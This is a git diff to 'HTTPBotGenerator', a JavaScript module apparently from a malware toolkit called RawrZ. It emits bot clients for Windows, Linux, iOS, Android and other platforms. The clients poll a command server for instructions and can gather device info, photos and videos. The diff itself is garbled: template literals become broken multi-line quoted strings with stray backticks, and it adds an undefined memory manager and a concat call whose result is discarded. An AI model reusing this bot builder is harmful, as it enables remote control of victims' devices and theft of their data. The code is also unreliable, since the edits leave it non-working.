@@ -3,6 +3,7 @@ const fs = require('fs').promises;
 const path = require('path');
 const { exec, spawn } = require('child_process');
 const { promisify } = require('util');
+const { getMemoryManager } = require('../utils/memory-manager');
 const os = require('os');
 const crypto = require('crypto');
 const { logger } = require('../utils/logger');
@@ -10,6 +11,19 @@ const { logger } = require('../utils/logger');
 const execAsync = promisify(exec);
 
 class HTTPBotGenerator {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor() {
         this.supportedLanguages = ['cpp', 'python', 'javascript', 'go', 'rust', 'csharp', 'swift', 'kotlin', 'java'];
         this.supportedPlatforms = ['windows', 'linux', 'macos', 'ios', 'android'];
@@ -22,7 +36,7 @@ class HTTPBotGenerator {
             'mobilePhotos', 'mobileVideos', 'mobileApps', 'mobileDeviceInfo',
             'mobileNetworkInfo', 'mobileBatteryInfo', 'mobileStorageInfo'
         ];
-        this.templates = new Map();
+        this.templates = this.memoryManager.createManagedCollection('templates', 'Map', 100);
         this.botStats = {
             totalGenerated: 0,
             successfulGenerations: 0,
@@ -48,8 +62,8 @@ class HTTPBotGenerator {
             this.templates.set(template.id, template);
         }
 
-        logger.info(`Loaded ${templates.length} HTTP bot templates`);
-        logger.info(`Loaded ${this.availableFeatures.length} HTTP bot features`);
+        logger.info("Loaded " + templates.length + " HTTP bot templates");
+        logger.info("Loaded " + this.availableFeatures.length + " HTTP bot features");
     }
 
     async generateBot(config, features, extensions) {
@@ -61,7 +75,7 @@ class HTTPBotGenerator {
             const botCode = this.generateBotCode(config, features, extension, timestamp, botId);
             generatedBots[extension] = {
                 code: botCode,
-                filename: `${config.name.toLowerCase()}.${this.getFileExtension(extension)}`,
+                filename: `${config.name.toLowerCase()}.this.getFileExtension(extension)`,
                 language: extension,
                 size: botCode.length
             };
@@ -88,19 +102,19 @@ class HTTPBotGenerator {
     generateCPPHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateCPPFeatures(features);
         
-        return `// RawrZ HTTP Bot - C++ Implementation
+        return "// RawrZ HTTP Bot - C++ Implementation
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
-#include <iostream>
-#include <windows.h>
-#include <wininet.h>
-#include <string>
-#include <vector>
-#include <thread>
-#include <chrono>
-#include <fstream>
-#include <sstream>
+#include <iostream>`
+#include <windows.h>`
+#include <wininet.h>`
+#include <string>`
+#include <vector>`
+#include <thread>`
+#include <chrono>`
+#include <fstream>`
+#include <sstream>`
 
 #pragma comment(lib, "wininet.lib")
 
@@ -174,7 +188,7 @@ public:
         char buffer[4096];
         DWORD bytesRead;
         
-        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead >` 0) {
             response.append(buffer, bytesRead);
         }
         
@@ -184,14 +198,14 @@ public:
         return response;
     }
     
-    ${featureCode.methods}
+    " + featureCode.methods + "
 };
 
 int main() {
     RawrZHTTPBot bot;
     bot.run();
     return 0;
-}`;
+}";
     }
 
     generateCPPFeatures(features) {
@@ -289,7 +303,7 @@ int main() {
     generatePythonHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generatePythonFeatures(features);
         
-        return `#!/usr/bin/env python3
+        return "#!/usr/bin/env python3
 # RawrZ HTTP Bot - Python Implementation
 # Generated: ${timestamp}
 # Bot ID: ${botId}
@@ -363,11 +377,11 @@ class RawrZHTTPBot:
             print(f"HTTP request failed: {e}")
             return ""
     
-    ${featureCode.methods}
+    " + featureCode.methods + "
 
 if __name__ == "__main__":
     bot = RawrZHTTPBot()
-    bot.run()`;
+    bot.run()";
     }
 
     generatePythonFeatures(features) {
@@ -459,7 +473,7 @@ if __name__ == "__main__":
     generateJavaScriptHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateJavaScriptFeatures(features);
         
-        return `// RawrZ HTTP Bot - JavaScript Implementation
+        return "// RawrZ HTTP Bot - JavaScript Implementation
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -471,12 +485,12 @@ class RawrZHTTPBot {
     constructor() {
         this.serverUrl = "${config.server || 'http://localhost:8080'}";
         this.botId = "${botId}";
-        this.botName = "${config.name || 'HTTPBot'}";
+        this.botName = `${config.name || 'HTTPBot'}`;
         this.isRunning = false;
     }
     
     async run() {
-        console.log(\`RawrZ HTTP Bot \${this.botId} starting...\`);
+        console.log(\"RawrZ HTTP Bot \${this.botId} starting...\");
         this.isRunning = true;
         
         // Initialize features
@@ -495,7 +509,7 @@ class RawrZHTTPBot {
                 }
                 
                 // Execute features
-                ${featureCode.execute}
+                " + featureCode.execute + "
                 
                 await this.sleep(5000);
             } catch (error) {
@@ -515,12 +529,12 @@ class RawrZHTTPBot {
     }
     
     async receiveCommand() {
-        const response = await this.sendHttpRequest(\`/bot/commands/\${this.botId}\`, {});
+        const response = await this.sendHttpRequest(\"/bot/commands/\${this.botId}\`, {});
         return response;
     }
     
     async executeCommand(command) {
-        console.log(\`Executing command: \${command}\`);
+        console.log(\"Executing command: \" + command + "\");
         // Command execution logic here
     }
     
@@ -660,7 +674,7 @@ bot.run().catch(console.error);`;
     }
 
     generateDefaultHTTPBot(config, features, timestamp, botId) {
-        return `// RawrZ HTTP Bot - Default Implementation
+        return "// RawrZ HTTP Bot - Default Implementation
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -669,13 +683,13 @@ bot.run().catch(console.error);`;
 
 console.log("RawrZ HTTP Bot ${botId} - Default Implementation");
 console.log("Server: ${config.server || 'http://localhost:8080'}");
-console.log("Features: ${features.join(', ')}");`;
+console.log(`Features: ${features.join(', ')}`);";
     }
 
     generateSwiftHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateSwiftFeatures(features);
         
-        return `// RawrZ HTTP Bot - Swift Implementation (iOS)
+        return "// RawrZ HTTP Bot - Swift Implementation (iOS)
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -763,7 +777,7 @@ class RawrZHTTPBot: NSObject {
         return responseData
     }
     
-    ${featureCode.methods}
+    " + featureCode.methods + "
 }
 
 // iOS App Delegate Integration
@@ -777,7 +791,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
         bot?.run()
         return true
     }
-}`;
+}";
     }
 
     generateSwiftFeatures(features) {
@@ -875,7 +889,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     generateKotlinHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateKotlinFeatures(features);
         
-        return `// RawrZ HTTP Bot - Kotlin Implementation (Android)
+        return "// RawrZ HTTP Bot - Kotlin Implementation (Android)
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -971,10 +985,10 @@ class RawrZHTTPBot : Service() {
         }
     }
     
-    ${featureCode.methods}
+    " + featureCode.methods + "
     
     override fun onBind(intent: Intent?): IBinder? = null
-}`;
+}";
     }
 
     generateKotlinFeatures(features) {
@@ -1036,17 +1050,17 @@ class RawrZHTTPBot : Service() {
         if (features.includes('mobileDeviceInfo')) {
             init += '        gatherDeviceInfo();\n';
             execute += '                updateDeviceInfo();\n';
-            methods += `    private fun gatherDeviceInfo() {
+            methods += "    private fun gatherDeviceInfo() {
         println("Device: \${android.os.Build.MODEL}")
         println("Android: \${android.os.Build.VERSION.RELEASE}")
-        println("SDK: \${android.os.Build.VERSION.SDK_INT}")
+        println(`SDK: \${android.os.Build.VERSION.SDK_INT}`)
     }
     
     private fun updateDeviceInfo() {
         // Device information updates
     }
     
-    `;
+    ";
         }
         
         if (features.includes('httpComm')) {
@@ -1069,7 +1083,7 @@ class RawrZHTTPBot : Service() {
     generateJavaHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateJavaFeatures(features);
         
-        return `// RawrZ HTTP Bot - Java Implementation (Cross-platform)
+        return "// RawrZ HTTP Bot - Java Implementation (Cross-platform)
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -1155,13 +1169,13 @@ public class RawrZHTTPBot {
         }
     }
     
-    ${featureCode.methods}
+    " + featureCode.methods + "
     
     public static void main(String[] args) {
         RawrZHTTPBot bot = new RawrZHTTPBot();
         bot.run();
     }
-}`;
+}";
     }
 
     generateJavaFeatures(features) {
@@ -1313,7 +1327,7 @@ public class RawrZHTTPBot {
             const botFiles = this.detectBotFiles();
             
             // Combine all detected bots
-            activeBots.push(...botProcesses, ...botConnections, ...botFiles);
+            activeBots.concat(botProcesses, ...botConnections, ...botFiles);
             
             // Remove duplicates based on ID
             const uniqueBots = activeBots.filter((bot, index, self) => 
